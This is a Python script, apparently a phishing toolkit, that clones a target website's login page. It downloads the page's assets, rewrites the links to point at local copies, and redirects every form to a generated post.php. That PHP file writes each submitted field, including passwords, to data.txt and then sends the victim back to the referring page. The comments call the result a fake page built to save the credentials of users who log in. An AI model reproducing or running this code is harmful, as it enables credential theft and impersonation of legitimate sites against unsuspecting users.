from bs4 import BeautifulSoup
import requests
import sys
import time
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
#this lines above and below for ssl problems
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#there are too many tries and excepts because if network is slow then connnection will be lost again and again

#check urls in html content
def check_it(url):
    if url[0] == '/':
        return url[1:]
    elif '..' in url:
        return url.split('..')[-1][1:]
    else:
        return url


try:
    if "http" not in str(sys.argv[1]):
        tmp_ = "http://"+sys.argv[1]
        print('Link:'+tmp_)
    else:
        tmp_ = sys.argv[1]
    page = requests.get(tmp_)
    print (page)
    print ("1")
    
    # tmp_2=page.content.decode("utf-8")
    # print('sdasd'+tmp_2)
    # metasoup=BeautifulSoup(page.content,'lxml')
    # for i in metasoup.findAll('meta')
    # try:
    if "URL=" in page.content:  # url= icin de yap
        # print(type(tmp_2))
        print("1.1")
        page = requests.get(tmp_2.split("URL=")[1].split('"')[0], verify=False)
except Exception as ex:
    try:
        page = requests.get(tmp_, verify=False)
        print (page)
        print("2")
        tmp_2 = page.content.decode("utf-8")
        print('Link tmp_2:'+tmp_2)
        if "URL=" in tmp_2:
            print(type(tmp_2))

            page = requests.get(tmp_2.split(
                "URL=")[1].split('"')[0], verify=False)
    except Exception as ex:
        #If error exist even after so many requests put the default fake page
        print("Error connection")
        os.system('python copyy.py 0')
        sys.exit(1)

url1 = str(page.url).split('/')[0]+"//"+str(page.url).split('/')[2]+"/"
print(url1)
# print(str(page.url).split('/')[0])
page_Bea = BeautifulSoup(page.content, "lxml")

#print (page.content)

#get images

img = page_Bea.findAll('img')
images = []
for i in img:
    if 'http' not in i['src']:
        images.append(url1+check_it(str(i['src'])))
    else:
        images.append(i['src'])

#get scripts

scr = page_Bea.findAll('script')
scripts = []
for i in scr:
    try:
        if 'http' not in i['src']:
            scripts.append(url1+check_it(str(i['src'])))
        else:
            scripts.append(i['src'])
    except:
        print ("")

#get images in td element
td = page_Bea.findAll('td')
tds = []
for i in td:
    try:
        if 'http' not in i['background']:
            tds.append(url1+check_it(str(i['background'])))
        else:
            tds.append(i['background'])
    except:
        print ("")

#find links for js,css,icon
link = page_Bea.findAll('link')
links = []
for i in link:
    try:
        print(i['rel'])
        if "stylesheet" in i['rel'] or "icon" in i['rel']:
            if 'http' not in i['href']:

                links.append(url1+i['href'])
            else:
                links.append(i['href'])

    except:
        print ("")

for i in links:
    print(i)

# print(os.getcwd())
file_path = "static/"
directory = os.path.dirname(file_path)
if not os.path.exists(directory):
    os.makedirs(directory)
os.chdir(file_path)
#we are in static directory

img_changed = []
scr_changed = []
link_changed = []
td_changed = []
print("DOWNLOADING")
#DOWNLOAD THEM
for i in images:
    print(i)
    try:
        cont = requests.get(i)
    except:
        try:
            cont = requests.get(i, verify=False)
        except:
            cont = requests.get(i, verify=False)
    time.sleep(2)
    with open(i.split('/')[len(i.split('/'))-1].split("?")[0], 'wb+') as f:
        f.write(cont.content)
    img_changed.append('./static/'+i.split('/')
                       [len(i.split('/'))-1].split("?")[0])

for i in scripts:
    print(i)
    # cont=requests.get(i,verify=False)
    try:
        cont = requests.get(i)
    except:
        try:
            cont = requests.get(i, verify=False)
        except:
            cont = requests.get(i, verify=False)
    time.sleep(2)
    with open(i.split('/')[len(i.split('/'))-1].split("?")[0], 'wb+') as f:
        f.write(cont.content)
    scr_changed.append('./static/'+i.split('/')
                       [len(i.split('/'))-1].split("?")[0])

for i in tds:
    print(i)
    # cont=requests.get(i,verify=False)
    try:
        cont = requests.get(i)
    except:
        try:
            cont = requests.get(i, verify=False)
        except:
            cont = requests.get(i, verify=False)

    time.sleep(2)
    with open(i.split('/')[len(i.split('/'))-1].split("?")[0], 'wb+') as f:
        f.write(cont.content)
    td_changed.append('./static/'+i.split('/')
                      [len(i.split('/'))-1].split("?")[0])


for i in links:
    print(i)
    # cont=requests.get(i,verify=False)
    try:
        cont = requests.get(i)
    except:
        try:
            cont = requests.get(i, verify=False)
        except:
            cont = requests.get(i, verify=False)

    time.sleep(3)
    with open(i.split('/')[len(i.split('/'))-1].split("?")[0], 'wb+') as f:
        f.write(cont.content)
    link_changed.append('./static/'+i.split('/')
                        [len(i.split('/'))-1].split("?")[0])

#change urls in page.content to prepare own fake page                        
i = 0
for img in page_Bea.findAll('img'):
    img['src'] = img_changed[i]
    i = i+1
i = 0
print(len(page_Bea.findAll('script')))
for scr in page_Bea.findAll('script'):
    try:
        if 'http' not in scr['src']:
            print(len(scr_changed))
            print (i)
            scr['src'] = scr_changed[i]
            i = i+1
    except:
        print("")
i = 0
# print(td_changed[0])
for tdd in page_Bea.findAll('td'):
    try:
        #print('http' not in tdd['background'])
        if 'http' not in tdd['background']:
            # print("@@")
            # print (str(i)+td_changed[i])# dont int with str cause error
            # print("##")
            tdd['background'] = td_changed[i]
            i = i+1
    except:
        print("")

i = 0
for link in page_Bea.findAll('link'):
    if "stylesheet" in link['rel'] or "icon" in link['rel']:
        link['href'] = link_changed[i]
        i = i+1


for i in images:
    print(i)

#get data which send them in POST request
inputs = []
for i in page_Bea.findAll('input'):
    try:
        inputs.append(i['name'])
    except:
        print("")
os.chdir("..")
#prepare post.php for save credentials if user logins
f = open('post.php', 'w')
f.write("<?php\n")
for i in inputs:
    f.write(
        'if(isset($_POST["'+str(i)+'"])){\n $ret=file_put_contents("data.txt",$_POST["'+str(i)+'"]."\n",FILE_APPEND|LOCK_EX);}')
# f.write('\n header("Location:http://localhost");')#Update it for own 
#f.write('\n header("Location:http://10.0.0.1");')
f.write('\n header("Location:".$_SERVER[\'HTTP_REFERER\']);') #redirect after submit to the login page again
f.write("?>")
f.close()
#forms action changed
for i in page_Bea.findAll('form'):
    i['action'] = 'post.php'
html = page_Bea.prettify("utf-8")
#create index.html
with open("index.html", "wb") as f:
    f.write(html)
print("OK")
try:
    if int(sys.argv[2]) == 1:
        os.system('python copyy.py 1')
    else:
        os.system('python copyy.py 0')
except:
    #if there is an error while copying files copy the default fake page
    os.system('python copyy.py 0')
